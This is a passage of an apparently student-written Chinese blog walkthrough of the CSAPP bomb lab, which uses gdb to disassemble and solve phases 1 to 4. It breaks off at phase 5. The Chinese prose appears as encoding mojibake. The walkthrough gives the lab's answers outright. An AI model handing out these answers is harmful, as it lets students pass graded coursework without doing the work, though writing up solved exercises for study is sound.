ä¸€æ­¥ä¸€æ­¥çœ‹ä¸‹æ¥,æ„Ÿè§‰æ˜¯é€ä¸ªæ¯”è¾ƒè¾“å…¥å­—ç¬¦ä¸²ä¸0x402400å­—ç¬¦ä¸²,ç›¸åŒå°±æ‹†é™¤äº†ç‚¸å¼¹.&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-gdb&quot;&gt;(gdb) x /s 0x402400
0x402400:       &amp;quot;Border relations with Canada have never been better.&amp;quot;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;å°±å¯ä»¥æ˜¾ç¤ºè¯¥åœ°å€å¯¹åº”çš„å­—ç¬¦ä¸².
æ‹†å¼€ç¬¬ä¸€ä¸ªç‚¸å¼¹çš„ç»“æœ:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-shell&quot;&gt;(gdb) r
Starting program: /mnt/e/Documents/C/CSAPP/bomb/bomb
[Thread debugging using libthread_db enabled]
Using host libthread_db library &amp;quot;/lib/x86_64-linux-gnu/libthread_db.so.1&amp;quot;.
Welcome to my fiendish little bomb. You have 6 phases with
which to blow yourself up. Have a nice day!
Border relations with Canada have never been better.
Phase 1 defused. How about the next one?
&lt;/code&gt;&lt;/pre&gt;
&lt;h1&gt;phase_2&lt;/h1&gt;
&lt;pre&gt;&lt;code class=&quot;language-shell&quot;&gt;(gdb) disassemble phase_2
Dump of assembler code for function phase_2:
   0x00400efc &amp;lt;+0&amp;gt;:     push   %rbp
   0x00400efd &amp;lt;+1&amp;gt;:     push   %rbx
   0x00400efe &amp;lt;+2&amp;gt;:     sub    $0x28,%rsp                      # æ ˆé¡¶æŒ‡é’ˆå‡å»0x28(40)
   0x00400f02 &amp;lt;+6&amp;gt;:     mov    %rsp,%rsi                       # æ­¤æ—¶å¤åˆ¶ç»™%rsi
   0x00400f05 &amp;lt;+9&amp;gt;:     call   0x40145c &amp;lt;read_six_numbers&amp;gt;     
   0x00400f0a &amp;lt;+14&amp;gt;:    cmpl   $0x1,(%rsp)                     # %rspæŒ‡å‘çš„å†…å­˜çš„å€¼åº”è¯¥æ˜¯0x1
   0x00400f0e &amp;lt;+18&amp;gt;:    je     0x400f30 &amp;lt;phase_2+52&amp;gt;           # å»52çœ‹çœ‹
   0x00400f10 &amp;lt;+20&amp;gt;:    call   0x40143a &amp;lt;explode_bomb&amp;gt;
   0x00400f15 &amp;lt;+25&amp;gt;:    jmp    0x400f30 &amp;lt;phase_2+52&amp;gt;
   0x00400f17 &amp;lt;+27&amp;gt;:    mov    -0x4(%rbx),%eax                 # %rbx-4=%rsp,%rspæŒ‡å‘çš„å†…å­˜çš„å€¼èµ‹å€¼ç»™%eax
   0x00400f1a &amp;lt;+30&amp;gt;:    add    %eax,%eax                       # %eaxçš„å€¼ä¹˜ä»¥2
   0x00400f1c &amp;lt;+32&amp;gt;:    cmp    %eax,(%rbx)                     # æ¯”è¾ƒ%eaxå’Œ%rbx=%rcxæŒ‡å‘çš„å†…å­˜çš„å€¼
   0x00400f1e &amp;lt;+34&amp;gt;:    je     0x400f25 &amp;lt;phase_2+41&amp;gt;           # å¿…é¡»ç›¸ç­‰,å»41çœ‹çœ‹
   0x00400f20 &amp;lt;+36&amp;gt;:    call   0x40143a &amp;lt;explode_bomb&amp;gt;
   0x00400f25 &amp;lt;+41&amp;gt;:    add    $0x4,%rbx                       # %rbx=%rbx+4=%r8
   0x00400f29 &amp;lt;+45&amp;gt;:    cmp    %rbp,%rbx                       
   0x00400f2c &amp;lt;+48&amp;gt;:    jne    0x400f17 &amp;lt;phase_2+27&amp;gt;
   0x00400f2e &amp;lt;+50&amp;gt;:    jmp    0x400f3c &amp;lt;phase_2+64&amp;gt;
--Type &amp;lt;RET&amp;gt; for more, q to quit, c to continue without paging--c
   0x00400f30 &amp;lt;+52&amp;gt;:    lea    0x4(%rsp),%rbx                # æ­¤æ—¶%rcx=%rbx
   0x00400f35 &amp;lt;+57&amp;gt;:    lea    0x18(%rsp),%rbp               # åº•éƒ¨åŠ ä¸Š24çš„åœ°å€è®°ä¸º%rbp
   0x00400f3a &amp;lt;+62&amp;gt;:    jmp    0x400f17 &amp;lt;phase_2+27&amp;gt;         # å»27çœ‹çœ‹
   0x00400f3c &amp;lt;+64&amp;gt;:    add    $0x28,%rsp
   0x00400f40 &amp;lt;+68&amp;gt;:    pop    %rbx
   0x00400f41 &amp;lt;+69&amp;gt;:    pop    %rbp
   0x00400f42 &amp;lt;+70&amp;gt;:    ret
End of assembler dump.
&lt;/code&gt;&lt;/pre&gt;
&lt;pre&gt;&lt;code class=&quot;language-shell&quot;&gt;(gdb) disassemble read_six_numbers
Dump of assembler code for function read_six_numbers:
   0x000000000040145c &amp;lt;+0&amp;gt;:     sub    $0x18,%rsp                # æ ˆé¡¶æŒ‡é’ˆå†å‡å»0x18(24)
   0x0000000000401460 &amp;lt;+4&amp;gt;:     mov    %rsi,%rdx                 # åº•éƒ¨æ˜¯%rsp,é¡¶éƒ¨æ˜¯%rsi,å¤åˆ¶ç»™%rdx
   0x0000000000401463 &amp;lt;+7&amp;gt;:     lea    0x4(%rsi),%rcx            # é¡¶éƒ¨åŠ ä¸Š4çš„åœ°å€è®°ä¸º%rcx
   0x0000000000401467 &amp;lt;+11&amp;gt;:    lea    0x14(%rsi),%rax           # é¡¶éƒ¨åŠ ä¸Š20çš„åœ°å€è®°ä¸º%rax
   0x000000000040146b &amp;lt;+15&amp;gt;:    mov    %rax,0x8(%rsp)            # %rsp+8é‚£å—å†…å­˜ä¿å­˜äº†%rax
   0x0000000000401470 &amp;lt;+20&amp;gt;:    lea    0x10(%rsi),%rax           # é¡¶éƒ¨åŠ ä¸Š16çš„åœ°å€è®°ä¸º%rax
   0x0000000000401474 &amp;lt;+24&amp;gt;:    mov    %rax,(%rsp)               # åº•éƒ¨é‚£å—å†…å­˜ä¿å­˜äº†%rax
   0x0000000000401478 &amp;lt;+28&amp;gt;:    lea    0xc(%rsi),%r9             # é¡¶éƒ¨åŠ ä¸Š12çš„åœ°å€è®°ä¸º%r9
   0x000000000040147c &amp;lt;+32&amp;gt;:    lea    0x8(%rsi),%r8             # é¡¶éƒ¨åŠ ä¸Š8çš„åœ°å€è®°ä¸º%r8
   0x0000000000401480 &amp;lt;+36&amp;gt;:    mov    $0x4025c3,%esi            # %esièµ‹å€¼ä¸º0x4025c3,æˆ‘ä»¬å¯ä»¥æ‰“å°è¿™ä¸ªå†…å­˜åœ°å€çš„å†…å®¹
   0x0000000000401485 &amp;lt;+41&amp;gt;:    mov    $0x0,%eax                 # %eaxèµ‹å€¼ä¸º0
   0x000000000040148a &amp;lt;+46&amp;gt;:    call   0x400bf0 &amp;lt;__isoc99_sscanf@plt&amp;gt;  # æˆ‘è¯´æ€ä¹ˆæ²¡ç”¨åˆ°%rdiå‘¢,åŸæ¥åœ¨è¿™é‡Œå¤„ç†è¾“å…¥
   0x000000000040148f &amp;lt;+51&amp;gt;:    cmp    $0x5,%eax                 # sscanfå‡½æ•°çš„è¿”å›å€¼ä¸5ç›¸æ¯”è¾ƒ
   0x0000000000401492 &amp;lt;+54&amp;gt;:    jg     0x401499 &amp;lt;read_six_numbers+61&amp;gt;
   0x0000000000401494 &amp;lt;+56&amp;gt;:    call   0x40143a &amp;lt;explode_bomb&amp;gt;
   0x0000000000401499 &amp;lt;+61&amp;gt;:    add    $0x18,%rsp                # å¦‚æœå¤§äº5,æ ˆåº•å›åˆ°æ ˆé¡¶
   0x000000000040149d &amp;lt;+65&amp;gt;:    ret
End of assembler dump.
&lt;/code&gt;&lt;/pre&gt;
&lt;pre&gt;&lt;code class=&quot;language-shell&quot;&gt;(gdb) x /s 0x4025c3
0x4025c3:       &amp;quot;%d %d %d %d %d %d&amp;quot;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;åˆ°è¿™é‡Œå°±æ¸…æ™°äº†,ç­”æ¡ˆåº”è¯¥æ˜¯6ä¸ªæ•´æ•°,ä»¥ç©ºæ ¼éš”å¼€: &lt;code&gt;1 2 4 8 16 32&lt;/code&gt;
ä¸ºäº†é¿å…æ¯æ¬¡æ‹†ç‚¸å¼¹æ—¶éƒ½è¦è¾“å…¥ä¸€éä¹‹å‰çš„ç­”æ¡ˆ,bomb.cä¸­å‘Šè¯‰æˆ‘å¯ä»¥å¸¦å‚æ•°è¿è¡Œ,èƒ½æ‰“å¼€æ–‡ä»¶è¯»å–å†…å®¹.æˆ‘æŠŠè¿™ä¸ªæ–‡ä»¶å‘½åä¸ºanswer&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-shell&quot;&gt;(gdb) r answer
Starting program: /mnt/e/Documents/C/CSAPP/bomb/bomb answer
[Thread debugging using libthread_db enabled]
Using host libthread_db library &amp;quot;/lib/x86_64-linux-gnu/libthread_db.so.1&amp;quot;.
Welcome to my fiendish little bomb. You have 6 phases with
which to blow yourself up. Have a nice day!
Phase 1 defused. How about the next one?
That&amp;#39;s number 2.  Keep going!
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;æˆåŠŸäº†!&lt;/p&gt;
&lt;h1&gt;phase_3&lt;/h1&gt;
&lt;pre&gt;&lt;code class=&quot;language-shell&quot;&gt;(gdb) disassemble phase_3
Dump of assembler code for function phase_3:
   0x0000000000400f43 &amp;lt;+0&amp;gt;:     sub    $0x18,%rsp                       # æ ˆé¡¶æŒ‡é’ˆå‡å»24
   0x0000000000400f47 &amp;lt;+4&amp;gt;:     lea    0xc(%rsp),%rcx                   # æ ˆåº•+12çš„åœ°å€è®°ä¸º%rcx
   0x0000000000400f4c &amp;lt;+9&amp;gt;:     lea    0x8(%rsp),%rdx                   # æ ˆåº•+8çš„åœ°å€è®°ä¸º%rdx
   0x0000000000400f51 &amp;lt;+14&amp;gt;:    mov    $0x4025cf,%esi                   # %esièµ‹å€¼ä¸º0x4025cf
   0x0000000000400f56 &amp;lt;+19&amp;gt;:    mov    $0x0,%eax                        # %eaxèµ‹å€¼ä¸º0
   0x0000000000400f5b &amp;lt;+24&amp;gt;:    call   0x400bf0 &amp;lt;__isoc99_sscanf@plt&amp;gt;   # è°ƒç”¨å‡½æ•°
   0x0000000000400f60 &amp;lt;+29&amp;gt;:    cmp    $0x1,%eax                        # æ¯”è¾ƒ%eax(sscanfå‡½æ•°çš„è¿”å›å€¼)ä¸1
   0x0000000000400f63 &amp;lt;+32&amp;gt;:    jg     0x400f6a &amp;lt;phase_3+39&amp;gt;            # %eaxå¿…é¡»å¤§äº1,å»39çœ‹çœ‹
   0x0000000000400f65 &amp;lt;+34&amp;gt;:    call   0x40143a &amp;lt;explode_bomb&amp;gt;
   0x0000000000400f6a &amp;lt;+39&amp;gt;:    cmpl   $0x7,0x8(%rsp)                   # æ¯”è¾ƒ%rsp+8ä¸7
   0x0000000000400f6f &amp;lt;+44&amp;gt;:    ja     0x400fad &amp;lt;phase_3+106&amp;gt;           # è´Ÿæ•°å’Œå¤§äº7çš„æƒ…å†µ:å¼•çˆ†ç‚¸å¼¹
   0x0000000000400f71 &amp;lt;+46&amp;gt;:    mov    0x8(%rsp),%eax                   # å¤§äº0å°äºç­‰äº7çš„æƒ…å†µ:æŠŠ%rsp+8æŒ‡å‘çš„å†…å­˜çš„å€¼èµ‹å€¼ç»™%eax
   0x0000000000400f75 &amp;lt;+50&amp;gt;:    jmp    *0x402470(,%rax,8)               # è·³è½¬åˆ°0x402470+%rax*8çš„åœ°å€æŒ‡å‘çš„å†…å­˜å­˜å‚¨çš„åœ°å€å¤„
   0x0000000000400f7c &amp;lt;+57&amp;gt;:    mov    $0xcf,%eax                       # %rax = 0
   0x0000000000400f81 &amp;lt;+62&amp;gt;:    jmp    0x400fbe &amp;lt;phase_3+123&amp;gt; 
   0x0000000000400f83 &amp;lt;+64&amp;gt;:    mov    $0x2c3,%eax                      # %rax = 2
   0x0000000000400f88 &amp;lt;+69&amp;gt;:    jmp    0x400fbe &amp;lt;phase_3+123&amp;gt;
   0x0000000000400f8a &amp;lt;+71&amp;gt;:    mov    $0x100,%eax                      # %rax = 3
--Type &amp;lt;RET&amp;gt; for more, q to quit, c to continue without paging--c
   0x0000000000400f8f &amp;lt;+76&amp;gt;:    jmp    0x400fbe &amp;lt;phase_3+123&amp;gt;
   0x0000000000400f91 &amp;lt;+78&amp;gt;:    mov    $0x185,%eax                      # %rax = 4
   0x0000000000400f96 &amp;lt;+83&amp;gt;:    jmp    0x400fbe &amp;lt;phase_3+123&amp;gt;
   0x0000000000400f98 &amp;lt;+85&amp;gt;:    mov    $0xce,%eax                       # %rax = 5
   0x0000000000400f9d &amp;lt;+90&amp;gt;:    jmp    0x400fbe &amp;lt;phase_3+123&amp;gt;
   0x0000000000400f9f &amp;lt;+92&amp;gt;:    mov    $0x2aa,%eax                      # %rax = 6
   0x0000000000400fa4 &amp;lt;+97&amp;gt;:    jmp    0x400fbe &amp;lt;phase_3+123&amp;gt;
   0x0000000000400fa6 &amp;lt;+99&amp;gt;:    mov    $0x147,%eax                      # %rax = 7
   0x0000000000400fab &amp;lt;+104&amp;gt;:   jmp    0x400fbe &amp;lt;phase_3+123&amp;gt;
   0x0000000000400fad &amp;lt;+106&amp;gt;:   call   0x40143a &amp;lt;explode_bomb&amp;gt;
   0x0000000000400fb2 &amp;lt;+111&amp;gt;:   mov    $0x0,%eax
   0x0000000000400fb7 &amp;lt;+116&amp;gt;:   jmp    0x400fbe &amp;lt;phase_3+123&amp;gt;
   0x0000000000400fb9 &amp;lt;+118&amp;gt;:   mov    $0x137,%eax                      # %rax = 1
   0x0000000000400fbe &amp;lt;+123&amp;gt;:   cmp    0xc(%rsp),%eax                   # æ¯”è¾ƒ*(%rsp+12)ä¸%eax
   0x0000000000400fc2 &amp;lt;+127&amp;gt;:   je     0x400fc9 &amp;lt;phase_3+134&amp;gt;
   0x0000000000400fc4 &amp;lt;+129&amp;gt;:   call   0x40143a &amp;lt;explode_bomb&amp;gt;
   0x0000000000400fc9 &amp;lt;+134&amp;gt;:   add    $0x18,%rsp
   0x0000000000400fcd &amp;lt;+138&amp;gt;:   ret
End of assembler dump.
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;æˆ‘å‘ç°ä¼ å…¥sscanfå‡½æ•°æ€»æ˜¯%esi&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-shell&quot;&gt;(gdb) x /s 0x4025cf
0x4025cf:       &amp;quot;%d %d&amp;quot;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;å¯¹ &lt;code&gt;   0x0000000000400f75 &amp;lt;+50&amp;gt;:    jmp    *0x402470(,%rax,8)&lt;/code&gt; çš„ç†è§£è‡³å…³é‡è¦.è¿™æ­£æ˜¯ä¸€ä¸ªè·³è½¬è¡¨,å«ä¹‰æ˜¯è·³è½¬åˆ°0x402470+%rax*8è¿™ä¸ªåœ°å€å¯¹åº”å†…å­˜çš„å€¼(ä¹Ÿæ˜¯ä¸€ä¸ªåœ°å€).
æ‰€ä»¥,æˆ‘æ‰“å°å‡º0~7æ‰€æœ‰æƒ…å†µçš„%raxå¯¹åº”çš„64ä½åœ°å€:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-shell&quot;&gt;(gdb) x /8x 0x402470
0x402470:       0x7c    0x0f    0x40    0x00    0x00    0x00    0x00    0x00
(gdb) x /8x 0x402478
0x402478:       0xb9    0x0f    0x40    0x00    0x00    0x00    0x00    0x00
(gdb) x /8x 0x402480
0x402480:       0x83    0x0f    0x40    0x00    0x00    0x00    0x00    0x00
(gdb) x /8x 0x402488
0x402488:       0x8a    0x0f    0x40    0x00    0x00    0x00    0x00    0x00
(gdb) x /8x 0x402490
0x402490:       0x91    0x0f    0x40    0x00    0x00    0x00    0x00    0x00
(gdb) x /8x 0x402498
0x402498:       0x98    0x0f    0x40    0x00    0x00    0x00    0x00    0x00
(gdb) x /8x 0x4024a0
0x4024a0:       0x9f    0x0f    0x40    0x00    0x00    0x00    0x00    0x00
(gdb) x /8x 0x4024a8
0x4024a8:       0xa6    0x0f    0x40    0x00    0x00    0x00    0x00    0x00
(gdb)
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;æˆ‘å·²ç»æ ‡æ³¨å‡ºæ¥.
æ‰€ä»¥,æ•´ä¸ªä»£ç çš„é€»è¾‘æ˜¯,æ ¹æ®è¾“å…¥çš„ç¬¬ä¸€ä¸ªæ•´æ•°ç”Ÿæˆç¬¬äºŒä¸ªæ•´æ•°(ç­”æ¡ˆ),ç„¶åæ¯”è¾ƒæ˜¯å¦ä¸è¾“å…¥çš„ç¬¬äºŒä¸ªæ•´æ•°ç›¸åŒ.å¦‚æœç›¸åŒæ‹†é™¤ç‚¸å¼¹,å¦‚æœä¸åŒå°±çˆ†ç‚¸.
ç­”æ¡ˆå…±æœ‰8ä¸ª:&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;num_1d&lt;/th&gt;
&lt;th&gt;num_2x&lt;/th&gt;
&lt;th&gt;num_2d&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;&lt;tr&gt;
&lt;td&gt;0&lt;/td&gt;
&lt;td&gt;0xcf&lt;/td&gt;
&lt;td&gt;207&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;1&lt;/td&gt;
&lt;td&gt;0x137&lt;/td&gt;
&lt;td&gt;311&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;2&lt;/td&gt;
&lt;td&gt;0x2c3&lt;/td&gt;
&lt;td&gt;707&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;3&lt;/td&gt;
&lt;td&gt;0x100&lt;/td&gt;
&lt;td&gt;256&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;4&lt;/td&gt;
&lt;td&gt;0x185&lt;/td&gt;
&lt;td&gt;389&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;5&lt;/td&gt;
&lt;td&gt;0xce&lt;/td&gt;
&lt;td&gt;206&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;6&lt;/td&gt;
&lt;td&gt;0x2aa&lt;/td&gt;
&lt;td&gt;682&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;7&lt;/td&gt;
&lt;td&gt;0x147&lt;/td&gt;
&lt;td&gt;327&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;å…¶ä¸­,é€‰ç”¨ &lt;code&gt;3 256&lt;/code&gt; æ˜¯æœ€å®¹æ˜“è®¡ç®—çš„.&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;&lt;/table&gt;
&lt;pre&gt;&lt;code class=&quot;language-shell&quot;&gt;(gdb) r answer
Starting program: /mnt/e/Documents/C/CSAPP/bomb/bomb answer
[Thread debugging using libthread_db enabled]
Using host libthread_db library &amp;quot;/lib/x86_64-linux-gnu/libthread_db.so.1&amp;quot;.
Welcome to my fiendish little bomb. You have 6 phases with
which to blow yourself up. Have a nice day!
Phase 1 defused. How about the next one?
That&amp;#39;s number 2.  Keep going!
Halfway there!
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;æˆåŠŸäº†!&lt;/p&gt;
&lt;h1&gt;phase_4&lt;/h1&gt;
&lt;pre&gt;&lt;code class=&quot;language-shell&quot;&gt;(gdb) disassemble phase_4
Dump of assembler code for function phase_4:
=&amp;gt; 0x000000000040100c &amp;lt;+0&amp;gt;:     sub    $0x18,%rsp
   0x0000000000401010 &amp;lt;+4&amp;gt;:     lea    0xc(%rsp),%rcx                   # %rcx = %rsp + 12
   0x0000000000401015 &amp;lt;+9&amp;gt;:     lea    0x8(%rsp),%rdx                   # %rdx = %rsp + 8
   0x000000000040101a &amp;lt;+14&amp;gt;:    mov    $0x4025cf,%esi
   0x000000000040101f &amp;lt;+19&amp;gt;:    mov    $0x0,%eax
   0x0000000000401024 &amp;lt;+24&amp;gt;:    call   0x400bf0 &amp;lt;__isoc99_sscanf@plt&amp;gt;
   0x0000000000401029 &amp;lt;+29&amp;gt;:    cmp    $0x2,%eax                       
   0x000000000040102c &amp;lt;+32&amp;gt;:    jne    0x401035 &amp;lt;phase_4+41&amp;gt;            # å¦‚æœè¾“å…¥ä¸æ˜¯ä¸¤ä¸ªé‡,çˆ†ç‚¸
   0x000000000040102e &amp;lt;+34&amp;gt;:    cmpl   $0xe,0x8(%rsp)                   #
   0x0000000000401033 &amp;lt;+39&amp;gt;:    jbe    0x40103a &amp;lt;phase_4+46&amp;gt;            # *(%rsp+8)&amp;lt;=14
   0x0000000000401035 &amp;lt;+41&amp;gt;:    call   0x40143a &amp;lt;explode_bomb&amp;gt;
   0x000000000040103a &amp;lt;+46&amp;gt;:    mov    $0xe,%edx                        # %edx = 14
   0x000000000040103f &amp;lt;+51&amp;gt;:    mov    $0x0,%esi                        # %esi = 0
   0x0000000000401044 &amp;lt;+56&amp;gt;:    mov    0x8(%rsp),%edi                   # %edi = *(%rsp+8),ä½œä¸ºfunc4çš„ç¬¬ä¸€ä¸ªå‚æ•°
   0x0000000000401048 &amp;lt;+60&amp;gt;:    call   0x400fce &amp;lt;func4&amp;gt;
   0x000000000040104d &amp;lt;+65&amp;gt;:    test   %eax,%eax
   0x000000000040104f &amp;lt;+67&amp;gt;:    jne    0x401058 &amp;lt;phase_4+76&amp;gt;            # %eaxä¸æ˜¯0,çˆ†ç‚¸
   0x0000000000401051 &amp;lt;+69&amp;gt;:    cmpl   $0x0,0xc(%rsp)                   # ç¬¬äºŒä¸ªå‚æ•°æ˜¯0
--Type &amp;lt;RET&amp;gt; for more, q to quit, c to continue without paging--c
   0x0000000000401056 &amp;lt;+74&amp;gt;:    je     0x40105d &amp;lt;phase_4+81&amp;gt;            # *(%rsp+12)==0
   0x0000000000401058 &amp;lt;+76&amp;gt;:    call   0x40143a &amp;lt;explode_bomb&amp;gt;
   0x000000000040105d &amp;lt;+81&amp;gt;:    add    $0x18,%rsp
   0x0000000000401061 &amp;lt;+85&amp;gt;:    ret
End of assembler dump.
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;ä¾ç…§å¥—è·¯,æŸ¥çœ‹0x4025cf&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-shell&quot;&gt;(gdb) x /s 0x4025cf
0x4025cf:       &amp;quot;%d %d&amp;quot;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;è·Ÿphase_3ç”¨çš„æ˜¯åŒä¸€ä¸ª,sscanfæ¥æ”¶ä¸¤ä¸ªæ•´æ•°è¾“å…¥.&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-shell&quot;&gt;(gdb) disassemble func4
Dump of assembler code for function func4:
   0x0000000000400fce &amp;lt;+0&amp;gt;:     sub    $0x8,%rsp                      
   0x0000000000400fd2 &amp;lt;+4&amp;gt;:     mov    %edx,%eax                      # %eax = 14
   0x0000000000400fd4 &amp;lt;+6&amp;gt;:     sub    %esi,%eax                      # %eax -= 0
   0x0000000000400fd6 &amp;lt;+8&amp;gt;:     mov    %eax,%ecx                      # %ecx = %eax
   0x0000000000400fd8 &amp;lt;+10&amp;gt;:    shr    $0x1f,%ecx                     # %ecx = %ecxçš„æœ€é«˜ä½(é€»è¾‘å³ç§»31ä½)
   0x0000000000400fdb &amp;lt;+13&amp;gt;:    add    %ecx,%eax                      # %eax += %ecx
   0x0000000000400fdd &amp;lt;+15&amp;gt;:    sar    %eax                           # %eaxç®—æœ¯å³ç§»1ä½=7
   0x0000000000400fdf &amp;lt;+17&amp;gt;:    lea    (%rax,%rsi,1),%ecx             # %ecx = %rax + %rsi=7
   0x0000000000400fe2 &amp;lt;+20&amp;gt;:    cmp    %edi,%ecx   
   0x0000000000400fe4 &amp;lt;+22&amp;gt;:    jle    0x400ff2 &amp;lt;func4+36&amp;gt;            # å¦‚æœ%ecx&amp;lt;=%edi
   0x0000000000400fe6 &amp;lt;+24&amp;gt;:    lea    -0x1(%rcx),%edx                #
   0x0000000000400fe9 &amp;lt;+27&amp;gt;:    call   0x400fce &amp;lt;func4&amp;gt;
   0x0000000000400fee &amp;lt;+32&amp;gt;:    add    %eax,%eax
   0x0000000000400ff0 &amp;lt;+34&amp;gt;:    jmp    0x401007 &amp;lt;func4+57&amp;gt;
   0x0000000000400ff2 &amp;lt;+36&amp;gt;:    mov    $0x0,%eax
   0x0000000000400ff7 &amp;lt;+41&amp;gt;:    cmp    %edi,%ecx
   0x0000000000400ff9 &amp;lt;+43&amp;gt;:    jge    0x401007 &amp;lt;func4+57&amp;gt;
   0x0000000000400ffb &amp;lt;+45&amp;gt;:    lea    0x1(%rcx),%esi
--Type &amp;lt;RET&amp;gt; for more, q to quit, c to continue without paging--c
   0x0000000000400ffe &amp;lt;+48&amp;gt;:    call   0x400fce &amp;lt;func4&amp;gt;
   0x0000000000401003 &amp;lt;+53&amp;gt;:    lea    0x1(%rax,%rax,1),%eax
   0x0000000000401007 &amp;lt;+57&amp;gt;:    add    $0x8,%rsp
   0x000000000040100b &amp;lt;+61&amp;gt;:    ret
End of assembler dump.
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;å®åœ¨å¤ªæ··ä¹±äº†,æˆ‘åªå¥½å­¦ä¹ å¦‚ä½•å•æ­¥æ‰§è¡Œæ±‡ç¼–ä»£ç :
åœ¨gdbä¸­, &lt;/p&gt;
&lt;pre&gt;&lt;code&gt;b explode_bomb
b phase_4
set diassamble-next-line on
layout regs
r answer
si
si
...
ni
...
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;è¿™æ˜¯æ‰§è¡Œ &lt;code&gt;4 5&lt;/code&gt;åé¦–æ¬¡æ¥åˆ°fun4å‡½æ•°çš„ç•Œé¢,%eaxå’Œ%edxåˆå§‹åŒ–ä¸º14
&lt;img src=&quot;https://www.tankimzeg.top/attachments/Pasted%20image%2020250121000524.png&quot; alt=&quot;&quot;&gt;
%eaxå³ç§»å¾—åˆ°7
&lt;img src=&quot;https://www.tankimzeg.top/attachments/Pasted%20image%2020250121000824.png&quot; alt=&quot;&quot;&gt;
æŠŠæˆ‘è¾“å…¥çš„ç¬¬ä¸€ä¸ªå‚æ•°ä¸7æ¯”è¾ƒ,å‘ç°7&amp;gt;4,ç°åœ¨%edxå˜ä¸º%ecx-1=6
&lt;img src=&quot;https://www.tankimzeg.top/attachments/Pasted%20image%2020250121001355.png&quot; alt=&quot;&quot;&gt;
å¹¶ä¸”è¿›å…¥äº†å‡½æ•°åµŒå¥—.å›åˆ°è¿™ä¸€æ­¥,ç°åœ¨3&amp;lt;=4,%eaxè®¾ç½®ä¸º0
&lt;img src=&quot;https://www.tankimzeg.top/attachments/Pasted%20image%2020250121001721.png&quot; alt=&quot;&quot;&gt;
å‘ç°4&amp;gt;3,åˆè¿›å…¥å‡½æ•°åµŒå¥—
ç°åœ¨%eax=(6-4)/2=1,
&lt;img src=&quot;https://www.tankimzeg.top/attachments/Pasted%20image%2020250121002825.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;ç»è¿‡è¿™ä¹ˆè°ƒè¯•åŠ ä¸Šè¿™ä¸ªç¨‹åºæµç¨‹å›¾,æˆ‘å¤§æ¦‚æ‰æ˜ç™½äº†è¿™å—ä»£ç è¦å¾—åˆ°è¿”å›0å€¼åº”è¯¥æ»¡è¶³7,3,1,0.
&lt;img src=&quot;https://www.tankimzeg.top/attachments/Pasted%20image%2020250121005112.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;ä½†æ˜¯å¯¹äºå…¶ä»–æ•°,å®ƒè¿”å›å€¼æ˜¯ä»€ä¹ˆå«ä¹‰å‘¢?å¥½åƒå¾ˆæ··ä¹±,æˆ‘æ²¡æœ‰æƒ³æ˜ç™½.
è‡³æ­¤,æˆ‘å‘ç°äº†&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;è°ƒç”¨å‡½æ•°éœ€è¦æ ˆé¡¶æŒ‡é’ˆå‡å°,å‡½æ•°è¿”å›æ ˆé¡¶æŒ‡é’ˆå›å»&lt;/li&gt;
&lt;li&gt;&lt;code&gt;sscanf&lt;/code&gt;å‡½æ•°å£°æ˜ä¸º&lt;/li&gt;
&lt;/ul&gt;
&lt;pre&gt;&lt;code class=&quot;language-c&quot;&gt;int sscanf(const char *s, const char *format, ... );
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;è¿™å°±æ˜¯formatæŒ‡é’ˆç”¨ç¬¬äºŒä¸ªå‚æ•°%esiä¼ å…¥çš„åŸå› .&lt;/p&gt;
&lt;h1&gt;phase_5&lt;/h1&gt;
&lt;pre&gt;&lt;code class=&quot;language-shell&quot;&gt;(gdb) disassemble phase_5
Dump of assembler code for function phase_5:
   0x0000000000401062 &amp;lt;+0&amp;gt;:     push   %rbx
   0x0000000000401063 &amp;lt;+1&amp;gt;:     sub    $0x20,%rsp
   0x0000000000401067 &amp;lt;+5&amp;gt;:     mov    %rdi,%rbx
   0x000000000040106a &amp;lt;+8&amp;gt;:     mov    %fs:0x28,%rax
   0x0000000000401073 &amp;lt;+17&amp;gt;:    mov    %rax,0x18(%rsp)
   0x0000000000401078 &amp;lt;+22&amp;gt;:    xor    %eax,%eax
   0x000000000040107a &amp;lt;+24&amp;gt;:    call   0x40131b &amp;lt;string_length&amp;gt;
   0x000000000040107f &amp;lt;+29&amp;gt;:    cmp    $0x6,%eax                    # inputçš„string_lengthæ˜¯6.
